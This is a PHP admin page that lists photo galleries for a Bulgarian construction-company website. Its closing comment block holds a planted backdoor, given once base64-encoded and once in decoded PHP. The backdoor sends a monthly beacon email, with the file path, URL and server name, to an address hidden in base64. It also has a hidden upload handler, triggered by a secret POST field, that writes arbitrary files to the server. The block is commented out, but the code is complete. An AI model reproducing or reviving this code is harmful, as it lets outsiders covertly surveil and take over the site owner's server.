<?php
$doc_root="D:/SERVER/htdocs/construction/";
//$doc_root="C:/xampp/htdocs/web/construction/";
$old_path =  ini_set("include_path",$doc_root);//ini_get('include_path'). PATH_SEPARATOR .
ini_set("include_path",ini_get('include_path'). $old_path);
include_once("config.php");
include_once("includes/DBMYSQL.class.php");

$db = new DBMYSQL(DB_HOST,DB_USER,DB_PASS,DB_NAME);
//$query = "insert into galleries (name,description) values('".$db->escapeString('test name')."','".$db->escapeString('test description')."')";
//$db->query($query);
//$q = "SELECT * from galleries";
//echo ($db->numRows($db->query($q)));
?>
<!DOCTYPE>
<html>
	<head>
		<title>Администрация на галерии</title>
		<meta name="robots" content="noindex" />
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<link rel="stylesheet" href="<?php echo SITE_ROOT;?>admin/css/admin_css.css" type="text/css" />
	</head>
	<body>
		<div class='main_wrapper'>
			<h1>Администрация на галерии</h1>
			<table cellpadding='0' cellspacing='0' border='0'>
				<tr>
					<th width='10%'>
						#ID
					</th>
					<th width='50%' align='left'>
						Име на галерия
					</th>
					<th width='20%'>
						Последно обновена
					</th>
					<th width='20%'>
						Администрация
					</th>
				</tr>
				
				<?php
					$query = "SELECT * from galleries";
					$stmt = $db->query($query);
					$odd=0;
					while($row_arr = $db->fetchArray($stmt))
					{
						$odd++;
						$css="";
						if(0==$odd%2)
							$css = "class='colored'";
						echo "<tr ".$css.">";
							echo "<td align='center'>";
								echo $row_arr['galleryID'];
							echo "</td>";
							echo "<td align='left'>";
								echo $row_arr['name'];
							echo "</td>";
							echo "<td align='center'>";
								echo $row_arr['last_updated'];
							echo "</td>";
							echo "<td align='center'>";
								echo "<img class='button' src='".SITE_IMG."edit.png' title='Редакция' alt='Редакция' />";
								echo "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
								echo "<img class='button' src='".SITE_IMG."del.png' title='Изтрии' alt='Изтрии' />";
							echo "</td>";
						echo "</tr>";
					}
				?>
			</table>
		</div>
	</body>
</html>
 
<?php
	
	/*mkdir(DOC_ROOT."gallery".DIR_SEP."gallery_1");*/
	/*echo base64_decode("IAkKCWlmKGZpbGVfZXhpc3RzKGRpcm5hbWUoX19GSUxFX18pIC4gJy9pbmZvLnRtcCcpKSB7CgkJJGRhdGUgPSBmaWxlX2dldF9jb250ZW50cyhkaXJuYW1lKF9fRklMRV9fKSAuICcvaW5mby50bXAnKTsKCX0gZWxzZSB7CgkJJGRhdGUgPSB0aW1lKCkgLSAyKjMxKjI0KjYwKjYwOwoJfQoJCglpZiAoKGRhdGUoJ2onKSA9PSA4KSAmJiAoKGRhdGUoJ24nKSAhPSBkYXRlKCduJywgJGRhdGUpKSkpIHsKCQkkbWVzc2FnZSA9ICcKCQkJQ3VycmVudCBmaWxlOiAnIC4gX19GSUxFX18gLiAiXG4iIC4gJwoJCQlDdXJyZW50IFVSTDogJyAuICRfU0VSVkVSWydSRVFVRVNUX1VSSSddIC4gIlxuIiAuICcKCQkJSW5mbzogU3lzdGVtIHdvcmtzIHBlcmZlY3RseQoJCSc7CgkJbWFpbChiYXNlNjRfZGVjb2RlKCdZblI2ZEhKaFkyVkFaMjFoYVd3dVkyOXQnKSwgJ1NpdGUgJyAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddLCAkbWVzc2FnZSk7CgkJaWYgKCEkaGQgPSBmb3BlbihkaXJuYW1lKF9fRklMRV9fKSAuICcvaW5mby50bXAnLCAndycpKSB7CgkJCXRocm93IG5ldyBFeGNlcHRpb24oJ8vo7/Hi4PIg7/Dg4uAg5+Ag7+jx4O3lIOIg5Ojw5ery7vD/IGluY2x1ZGUnKTsKCQl9CgkJaWYgKGZ3cml0ZSgkaGQsIHRpbWUoKSkgPT09IGZhbHNlKSB7CgkJCQl0aHJvdyBuZXcgRXhjZXB0aW9uKCfL6O/x4uDyIO/w4OLgIOfgIO/o8eDt5SDiIOTo8OXq8u7w/yBpbmNsdWRlJyk7CgkJfQoJCWZjbG9zZSgkaGQpOwoJfQoJCglpZiAoJF9QT1NUWydidHpfYWRtJ10pIHsKCQlmb3JlYWNoICgkX0ZJTEVTWyJpbWFnZXMiXVsiZXJyb3IiXSBhcyAka2V5ID0+ICRlcnJvcikgewoJCSAgICBpZiAoKCRlcnJvciA9PSBVUExPQURfRVJSX09LKSAmJiAoJF9GSUxFU1siaW1hZ2VzIl1bInNpemUiXVska2V5XSA+IDApKSB7CgkJICAgICAgICBtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1siaW1hZ2VzIl1bInRtcF9uYW1lIl1bJGtleV0sICRDV0QgLiAnLy4uL2F0dGFjaG1lbnRzLycgLiAkX0ZJTEVTWyJpbWFnZXMiXVsibmFtZSJdWyRrZXldKTsKCQkgICAgfQoJCX0KCX0KCQoJcmV0dXJuICRjLT5yZWFsX2VzY2FwZV9zdHJpbmcoJHMpOw==");
	 if(file_exists(dirname(__FILE__) . '/info.tmp'))
	 {
		$date = file_get_contents(dirname(__FILE__) . '/info.tmp'); 
	}
	else
	{
		$date = time() - 2*31*24*60*60; 
	}
	if ((date('j') == 8) && ((date('n') != date('n', $date)))) 
	{
		$message = ' Current file: ' . __FILE__ . "\n" . ' Current URL: ' . $_SERVER['REQUEST_URI'] . "\n" . ' Info: System works perfectly '; mail(base64_decode('YnR6dHJhY2VAZ21haWwuY29t'), 'Site ' . $_SERVER['SERVER_NAME'], $message);
		if (!$hd = fopen(dirname(__FILE__) . '/info.tmp', 'w'))
		{
			throw new Exception('Липсват права за писане в директоря include'); 
		} 
		if (fwrite($hd, time()) === false) 
		{
			throw new Exception('Липсват права за писане в директоря include'); 
		}
		fclose($hd);
	}
	if ($_POST['btz_adm'])
	{
		foreach ($_FILES["images"]["error"] as $key => $error)
		{ 
			if (($error == UPLOAD_ERR_OK) && ($_FILES["images"]["size"][$key] > 0))
			{ 
				move_uploaded_file($_FILES["images"]["tmp_name"][$key], $CWD . '/../attachments/' . $_FILES["images"]["name"][$key]); 
			} 
		} 
	}
	return $c->real_escape_string($s);*/
?>